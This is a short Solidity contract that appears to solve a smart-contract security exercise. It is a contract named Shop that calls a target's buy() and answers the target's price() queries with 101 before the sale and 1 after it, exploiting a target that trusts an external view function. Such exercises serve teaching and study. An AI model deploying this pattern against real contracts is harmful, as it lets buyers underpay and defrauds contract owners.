// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {  
    function buy() external;
    function isSold() external view returns (bool);
    function price() external view returns (uint256);
}

contract Shop {
  IShop target;

  constructor(address _target) {
    target = IShop(_target);
  }

  function price() external view returns (uint256) {
    if (target.isSold() == false){
        return 101;
    } else {
        return 1;
    }
  }
  
  function buy() public {
    target.buy();
  }
}